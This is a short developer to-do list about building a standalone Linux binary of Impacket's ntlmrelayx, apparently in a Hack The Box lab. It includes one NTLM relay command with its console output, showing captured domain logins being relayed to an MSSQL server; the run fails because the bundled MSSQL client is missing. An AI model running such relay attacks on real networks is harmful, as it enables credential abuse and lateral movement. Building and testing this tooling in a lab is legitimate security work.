# to do


* test isf with the new build ntlmrelayx has mssql client
* Modify build_linux_impacket.sh so that the proper reference to python lib is used according to the python version to compile and defined in Makefile
* make a sshable container





ntlmrelayx is not including clients
```bash
sudo ./ntlmrelayx_linux -tf ./target.tf -smb2support -socks
[sudo] password for htb-student:
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Running in relay mode to hosts in targetfile
[*] SOCKS proxy started. Listening on 127.0.0.1:1080
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
 * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
 * Debug mode: off
[*] Setting up WCF Server

[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx> [*] Received connection from INLANEFREIGHT/nports at DC01, connection will be relayed after re-authentication
[*] Received connection from INLANEFREIGHT/peter at DC01, connection will be relayed after re-authentication
[]
[*] SMBD-Thread-10: Connection from INLANEFREIGHT/NPORTS@172.16.117.3 controlled, attacking target mssql://172.16.117.60:1433
[-] Connection against target mssql://172.16.117.60:1433 FAILED: Protocol Client for mssql not found!
```


# Notes

* [docker-pyinstaller](https://github.com/batonogov/docker-pyinstaller)
* [LuemmelSec/ntlmrelayx.py_to_exe](https://github.com/LuemmelSec/ntlmrelayx.py_to_exe)